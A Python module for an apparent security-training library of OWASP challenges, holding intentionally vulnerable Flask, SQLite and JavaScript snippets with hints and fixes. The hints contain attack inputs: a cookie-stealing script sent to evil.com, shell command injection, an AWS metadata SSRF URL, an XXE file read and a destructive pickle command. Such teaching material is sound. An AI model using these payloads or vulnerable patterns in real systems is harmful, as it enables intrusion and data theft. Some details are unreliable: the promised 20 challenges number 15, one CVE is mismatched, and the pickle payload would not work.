"""
CyberMentor — Security Challenge Library

20 real-world inspired OWASP Top 10 challenges with vulnerable code,
expected fixes, and difficulty ratings.
"""

from dataclasses import dataclass, field
from typing import Literal

Difficulty = Literal["beginner", "intermediate", "advanced"]

@dataclass
class Challenge:
    id: str
    title: str
    owasp_id: str
    owasp_name: str
    difficulty: Difficulty
    language: str
    description: str
    vulnerable_code: str
    hints: list[str]
    cve_example: str | None = None
    tags: list[str] = field(default_factory=list)

CHALLENGES: list[Challenge] = [
    Challenge(
        id="sqli-01",
        title="The Login That Lets Everyone In",
        owasp_id="A03",
        owasp_name="Injection",
        difficulty="beginner",
        language="python",
        description="A developer wrote a login function that checks username and password against a database. Can you spot why any user could log in with the password `' OR '1'='1`?",
        vulnerable_code="""import sqlite3

def login(username: str, password: str) -> bool:
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()

    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    result = cursor.fetchone()

    conn.close()
    return result is not None""",
        hints=[
            "What happens when `password` is set to `' OR '1'='1`?",
            "The SQL query becomes: `SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'`",
            "Use parameterized queries — never build SQL strings with user input"
        ],
        cve_example="CVE-2012-1823 (PHP CGI argument injection)",
        tags=["sql", "injection", "login", "authentication"]
    ),

    Challenge(
        id="xss-01",
        title="The Message Board That Remembers Too Much",
        owasp_id="A03",
        owasp_name="Injection",
        difficulty="beginner",
        language="javascript",
        description="This comment rendering function in a message board app directly inserts user content into the DOM. Why is this dangerous, and what could an attacker post?",
        vulnerable_code="""// React-like component (vanilla JS)
function renderComment(comment) {
    const div = document.createElement('div');
    div.innerHTML = comment.text;  // ← user-supplied content
    document.getElementById('comments').appendChild(div);
}

// Usage
fetch('/api/comments')
    .then(r => r.json())
    .then(comments => comments.forEach(renderComment));""",
        hints=[
            "What if `comment.text` contains `<script>fetch('https://evil.com?cookie='+document.cookie)</script>`?",
            "innerHTML parses and executes HTML including script tags",
            "Use textContent instead, or a sanitisation library like DOMPurify"
        ],
        cve_example="CVE-2018-6492 (Stored XSS in HP Service Manager)",
        tags=["xss", "dom", "javascript", "stored-xss"]
    ),

    Challenge(
        id="idor-01",
        title="Whose Invoice Is This Anyway?",
        owasp_id="A01",
        owasp_name="Broken Access Control",
        difficulty="beginner",
        language="python",
        description="This API endpoint lets users download their invoices. User 42 just discovered they can download user 1's invoice by changing the URL. What's missing?",
        vulnerable_code="""from flask import Flask, request, send_file, g

app = Flask(__name__)

@app.route('/api/invoice/<int:invoice_id>')
def get_invoice(invoice_id: int):
    # Fetch invoice from DB
    invoice = db.query(
        "SELECT * FROM invoices WHERE id = ?",
        (invoice_id,)
    ).fetchone()

    if not invoice:
        return {"error": "Not found"}, 404

    # Return invoice PDF
    return send_file(f"invoices/{invoice_id}.pdf")""",
        hints=[
            "The endpoint retrieves ANY invoice by ID — no ownership check!",
            "There's no check: does the logged-in user OWN this invoice?",
            "Add: `if invoice['user_id'] != g.current_user.id: return 403`"
        ],
        cve_example="OWASP IDOR pattern — extremely common in REST APIs",
        tags=["idor", "authorization", "api", "flask"]
    ),

    Challenge(
        id="hardcoded-secret",
        title="Secrets in Plain Sight",
        owasp_id="A02",
        owasp_name="Cryptographic Failures",
        difficulty="beginner",
        language="python",
        description="A developer pushed this authentication module to a public GitHub repo. What's the critical mistake that attackers will exploit within minutes?",
        vulnerable_code="""import jwt
from datetime import datetime, timedelta

# JWT configuration
SECRET_KEY = "mysecretkey123"
ALGORITHM = "HS256"

def create_token(user_id: int) -> str:
    payload = {
        "sub": str(user_id),
        "exp": datetime.utcnow() + timedelta(hours=24)
    }
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

def verify_token(token: str) -> dict:
    return jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])""",
        hints=[
            "The SECRET_KEY is hardcoded — anyone who reads this code can forge any JWT",
            "git history preserves secrets even after 'fix' commits",
            "Load from environment: `SECRET_KEY = os.environ['JWT_SECRET']`"
        ],
        cve_example="CVE-2021-20323 (Keycloak hardcoded secret)",
        tags=["secrets", "jwt", "credentials", "environment-variables"]
    ),

    Challenge(
        id="cmdi-01",
        title="The Ping Tool That Pings Too Much",
        owasp_id="A03",
        owasp_name="Injection",
        difficulty="intermediate",
        language="python",
        description="A network utility lets admins ping a host from the server. An attacker found they can run any command on the server. How?",
        vulnerable_code="""import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/admin/ping')
def ping_host():
    host = request.args.get('host', '')

    # Run ping command
    result = subprocess.run(
        f"ping -c 4 {host}",
        shell=True,
        capture_output=True,
        text=True
    )

    return {"output": result.stdout, "error": result.stderr}""",
        hints=[
            "Try `host=8.8.8.8; cat /etc/passwd` — the semicolon starts a new command",
            "`shell=True` with user input is almost always a command injection vulnerability",
            "Use a list of arguments instead: `subprocess.run(['ping', '-c', '4', host])`"
        ],
        cve_example="CVE-2014-6271 (Shellshock)",
        tags=["command-injection", "subprocess", "shell", "flask"]
    ),

    Challenge(
        id="ssrf-01",
        title="The Webhook That Calls Home",
        owasp_id="A10",
        owasp_name="Server-Side Request Forgery",
        difficulty="intermediate",
        language="python",
        description="This webhook validator fetches a URL provided by the user to verify it returns 200 OK. Why could this let an attacker read your AWS credentials?",
        vulnerable_code="""import requests
from flask import Flask, request

app = Flask(__name__)

@app.route('/api/webhook/verify', methods=['POST'])
def verify_webhook():
    data = request.get_json()
    webhook_url = data.get('url', '')

    # Verify the endpoint is reachable
    try:
        response = requests.get(webhook_url, timeout=5)
        return {
            "reachable": True,
            "status_code": response.status_code,
            "body_preview": response.text[:200]
        }
    except Exception as e:
        return {"reachable": False, "error": str(e)}""",
        hints=[
            "Try `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` — that's the AWS metadata API",
            "The server makes the request, so firewall rules don't protect you",
            "Validate URLs: block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x)"
        ],
        cve_example="CVE-2019-3799 (Spring Cloud Config SSRF)",
        tags=["ssrf", "metadata", "aws", "webhook", "requests"]
    ),

    Challenge(
        id="insecure-deser",
        title="The Pickle Jar of Doom",
        owasp_id="A08",
        owasp_name="Software and Data Integrity Failures",
        difficulty="intermediate",
        language="python",
        description="This caching system stores user session data as pickled bytes. What happens when an attacker sends a crafted cookie?",
        vulnerable_code="""import pickle
import base64
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/dashboard')
def dashboard():
    session_cookie = request.cookies.get('session', '')

    if session_cookie:
        # Deserialize user session
        session_data = pickle.loads(
            base64.b64decode(session_cookie)
        )
        user = session_data.get('user')
    else:
        user = None

    return {"user": user}""",
        hints=[
            "pickle.loads executes arbitrary Python code embedded in the pickled data",
            "An attacker crafts: `pickle.dumps({'__reduce__': (os.system, ('rm -rf /',))})` — runs on deserialization",
            "Never pickle user-supplied data. Use JWT or signed JSON (itsdangerous)"
        ],
        cve_example="CVE-2019-6340 (Drupal remote code execution via deserialization)",
        tags=["deserialization", "pickle", "rce", "cookies", "python"]
    ),

    Challenge(
        id="path-traversal",
        title="The File Server That Serves Everything",
        owasp_id="A01",
        owasp_name="Broken Access Control",
        difficulty="intermediate",
        language="python",
        description="Users can download files from their personal upload folder. Why can an attacker download `/etc/passwd` by requesting `../../etc/passwd`?",
        vulnerable_code="""from flask import Flask, request, send_file
import os

app = Flask(__name__)
UPLOAD_DIR = "/var/app/uploads"

@app.route('/files/download')
def download_file():
    user_id = request.args.get('user_id')
    filename = request.args.get('filename')

    file_path = os.path.join(UPLOAD_DIR, user_id, filename)

    if os.path.exists(file_path):
        return send_file(file_path)
    return {"error": "File not found"}, 404""",
        hints=[
            "`filename=../../etc/passwd` resolves to `/var/app/uploads/42/../../etc/passwd` = `/etc/passwd`",
            "os.path.join doesn't strip `../` sequences",
            "Fix: `os.path.realpath(file_path)` then check it starts with UPLOAD_DIR"
        ],
        cve_example="CVE-2021-41773 (Apache HTTP Server path traversal)",
        tags=["path-traversal", "directory-traversal", "file-access", "flask"]
    ),

    Challenge(
        id="weak-crypto",
        title="The Password Vault Built on Sand",
        owasp_id="A02",
        owasp_name="Cryptographic Failures",
        difficulty="intermediate",
        language="python",
        description="This user registration stores passwords. A database breach would expose all 10 million users' passwords in seconds. Why?",
        vulnerable_code="""import hashlib
from database import db

def register_user(username: str, password: str) -> dict:
    # Hash the password for storage
    password_hash = hashlib.md5(password.encode()).hexdigest()

    user = db.users.insert({
        "username": username,
        "password_hash": password_hash
    })

    return {"id": user.id, "username": username}

def verify_password(username: str, password: str) -> bool:
    user = db.users.find_one({"username": username})
    return user and user["password_hash"] == hashlib.md5(password.encode()).hexdigest()""",
        hints=[
            "MD5 is not a password hashing function — it's a checksum. 10 billion MD5s/second on a GPU.",
            "Rainbow tables exist for all common MD5 hashes — no salt means identical passwords → identical hashes",
            "Use bcrypt, scrypt, or argon2: `bcrypt.hashpw(password.encode(), bcrypt.gensalt())`"
        ],
        cve_example="LinkedIn 2012 breach: 117M MD5-hashed passwords cracked within days",
        tags=["md5", "password-hashing", "bcrypt", "cryptography"]
    ),

    Challenge(
        id="missing-auth",
        title="The Admin Panel Without a Door",
        owasp_id="A07",
        owasp_name="Identification and Authentication Failures",
        difficulty="beginner",
        language="python",
        description="This admin dashboard powers the company's internal tools. Why can any employee (or attacker who knows the URL) access it?",
        vulnerable_code="""from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/admin/dashboard')
def admin_dashboard():
    stats = get_system_stats()
    users = db.get_all_users()
    return render_template('admin.html', stats=stats, users=users)

@app.route('/admin/delete-user', methods=['POST'])
def delete_user():
    user_id = request.form['user_id']
    db.delete_user(user_id)
    return {"success": True}

@app.route('/admin/export-data')
def export_data():
    return db.export_all_user_data()""",
        hints=[
            "There's no authentication check on ANY of these routes",
            "Anyone who knows `/admin/dashboard` exists can access and delete users",
            "Add a decorator: `@require_role('admin')` or check `g.current_user.is_admin`"
        ],
        cve_example="Bing Maps admin panel exposure (2013) — public URL revealed internal data",
        tags=["authentication", "authorization", "admin", "access-control"]
    ),

    Challenge(
        id="race-condition",
        title="The Bank That Lets You Double-Spend",
        owasp_id="A04",
        owasp_name="Insecure Design",
        difficulty="advanced",
        language="python",
        description="This payment endpoint has a subtle race condition that lets users spend the same money twice by sending two simultaneous requests. Can you find it?",
        vulnerable_code="""from flask import Flask, request, g

app = Flask(__name__)

@app.route('/api/transfer', methods=['POST'])
def transfer_money():
    data = request.get_json()
    amount = data['amount']
    to_account = data['to_account']

    user = db.get_user(g.current_user_id)

    # Check balance
    if user.balance < amount:
        return {"error": "Insufficient funds"}, 400

    # Deduct from sender (gap here — not atomic!)
    db.update_balance(user.id, user.balance - amount)

    # Add to recipient
    recipient = db.get_user(to_account)
    db.update_balance(recipient.id, recipient.balance + amount)

    return {"success": True, "new_balance": user.balance - amount}""",
        hints=[
            "Two simultaneous requests both pass the balance check before either deducts",
            "The read-check-write is not atomic — classic TOCTOU (Time of Check to Time of Use)",
            "Use database-level locking: `UPDATE accounts SET balance = balance - ? WHERE id = ? AND balance >= ?`"
        ],
        cve_example="Multiple crypto exchange exploits — race condition double-spend attacks",
        tags=["race-condition", "toctou", "atomicity", "database", "payments"]
    ),

    Challenge(
        id="jwt-none",
        title="The Token That Signs Itself",
        owasp_id="A02",
        owasp_name="Cryptographic Failures",
        difficulty="advanced",
        language="python",
        description="This JWT verification function has a famous vulnerability that lets attackers forge any token and log in as any user. This affected hundreds of libraries until 2015.",
        vulnerable_code="""import jwt
import json
import base64

def verify_token(token: str, secret: str) -> dict:
    # Decode header to get algorithm
    header_b64 = token.split('.')[0]
    header = json.loads(base64.b64decode(header_b64 + '=='))

    algorithm = header.get('alg', 'HS256')

    # Verify with detected algorithm
    return jwt.decode(token, secret, algorithms=[algorithm])

# An attacker creates a token with header: {"alg": "none"}
# Signature becomes empty — jwt.decode accepts it!""",
        hints=[
            "Setting `alg: none` in the JWT header tells the library to skip signature verification",
            "Never trust the algorithm field from the token itself — hardcode it on the server",
            "Fix: `jwt.decode(token, secret, algorithms=['HS256'])` — never pass `algorithm` from the token"
        ],
        cve_example="CVE-2015-9235 — 'none' algorithm bypass affected jsonwebtoken, python-jwt, and others",
        tags=["jwt", "algorithm-confusion", "none-algorithm", "authentication"]
    ),

    Challenge(
        id="mass-assignment",
        title="The Registration Form That Promotes Itself",
        owasp_id="A01",
        owasp_name="Broken Access Control",
        difficulty="intermediate",
        language="python",
        description="A user registration endpoint directly maps request JSON to the user model. Can you see how a regular user could make themselves an admin?",
        vulnerable_code="""from flask import Flask, request
from models import User

app = Flask(__name__)

@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()

    # Create user from all provided fields
    user = User(**data)
    db.session.add(user)
    db.session.commit()

    return {"id": user.id, "username": user.username}, 201

# User model has fields:
# id, username, email, password_hash, is_admin, created_at""",
        hints=[
            "POST `{'username': 'hacker', 'email': 'h@x.com', 'is_admin': true}` creates an admin user",
            "Never pass `**request.json` directly to your model constructor",
            "Use an allowlist: `User(username=data['username'], email=data['email'])` — only trusted fields"
        ],
        cve_example="GitHub 2012 mass assignment — allowed adding SSH keys to any organization",
        tags=["mass-assignment", "api", "privilege-escalation", "flask"]
    ),

    Challenge(
        id="xxe-01",
        title="The XML Parser That Reads Your Files",
        owasp_id="A05",
        owasp_name="Security Misconfiguration",
        difficulty="advanced",
        language="python",
        description="This invoice import feature accepts XML files. Why can an attacker read any file on the server by uploading a crafted XML?",
        vulnerable_code="""from lxml import etree
from flask import Flask, request

app = Flask(__name__)

@app.route('/api/import/invoice', methods=['POST'])
def import_invoice():
    xml_data = request.get_data()

    # Parse XML invoice
    root = etree.fromstring(xml_data)

    invoice = {
        "number": root.findtext('InvoiceNumber'),
        "amount": root.findtext('Amount'),
        "vendor": root.findtext('Vendor'),
    }

    return {"imported": invoice}""",
        hints=[
            "An attacker sends: `<?xml version='1.0'?><!DOCTYPE x [<!ENTITY f SYSTEM 'file:///etc/passwd'>]><Invoice><Vendor>&f;</Vendor></Invoice>`",
            "lxml by default resolves external entities — this reads `/etc/passwd` into the response",
            "Fix: `parser = etree.XMLParser(resolve_entities=False, no_network=True)`"
        ],
        cve_example="CVE-2014-1904 (Spring XXE), CVE-2019-0340 (SAP XXE)",
        tags=["xxe", "xml", "external-entities", "lxml", "file-read"]
    ),

    Challenge(
        id="open-redirect",
        title="The Login Page That Sends You Anywhere",
        owasp_id="A01",
        owasp_name="Broken Access Control",
        difficulty="beginner",
        language="python",
        description="This login flow redirects users back to their requested page after login. How could an attacker use this for phishing?",
        vulnerable_code="""from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/login', methods=['GET', 'POST'])
def login():
    next_url = request.args.get('next', '/dashboard')

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        if authenticate(username, password):
            return redirect(next_url)  # ← Unvalidated redirect!

    return render_template('login.html')

# Phishing URL:
# https://yourbank.com/login?next=https://evil.com/steal-creds""",
        hints=[
            "Attacker emails: 'Log in to your account: bank.com/login?next=evil.com/fake-bank'",
            "User sees the legitimate bank.com domain, logs in, then gets sent to evil.com",
            "Validate `next` is a relative URL: `if not next_url.startswith('/'): next_url = '/dashboard'`"
        ],
        cve_example="Open redirects are used in phishing campaigns against banks and OAuth providers",
        tags=["open-redirect", "phishing", "login", "redirect"]
    ),
]

def get_challenge(challenge_id: str) -> Challenge | None:
    return next((c for c in CHALLENGES if c.id == challenge_id), None)

def get_challenges_by_difficulty(difficulty: Difficulty) -> list[Challenge]:
    return [c for c in CHALLENGES if c.difficulty == difficulty]

def get_challenges_by_owasp(owasp_id: str) -> list[Challenge]:
    return [c for c in CHALLENGES if c.owasp_id == owasp_id]
